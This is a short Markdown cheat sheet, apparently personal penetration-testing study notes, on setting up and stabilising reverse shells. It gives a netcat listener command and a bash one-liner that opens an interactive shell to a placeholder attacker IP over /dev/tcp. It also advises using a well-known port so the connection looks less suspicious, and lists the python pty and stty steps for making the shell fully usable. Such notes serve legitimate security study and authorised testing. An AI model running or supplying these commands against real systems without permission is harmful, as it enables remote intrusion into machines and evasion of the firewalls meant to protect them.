## Everything about reverse shells

Target machines initiates the connection to attacker sets up listener.  
Firewalls mostly filter incoming traffic only so reverse shell will often get through.  

### Step 1

Setup a listener

nc -lvnp <portnumber>

* If target is running linux then bash shell is a good option

/bin/bash -i >& /dev/tcp/<attacker ip>/<portnumber> 0>&1

Cheat sheet - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet  

Output port should be a well known port so that its less suspicious  

## Stablizing a shell

1) Python  

python -c "import pty;pty.spawn('/bin/bash')"  

Looks better but tab, up-down keys and Ctrl C still dont work  

export TERM=xterm-256color gives access to commands like clear  

Backgroud the shell using Ctrl+Z  

stty raw -echo; fg Does two things, turns off terminals echo (so autocomplete, arrow keys and ctrl+c works now). And then brings the shell back to foreground.  

2) Using rlwrap => https://github.com/dvanmosselbeen/security-cheat-sheet/wiki/reverse-shell#technique-2-with-rlwrap

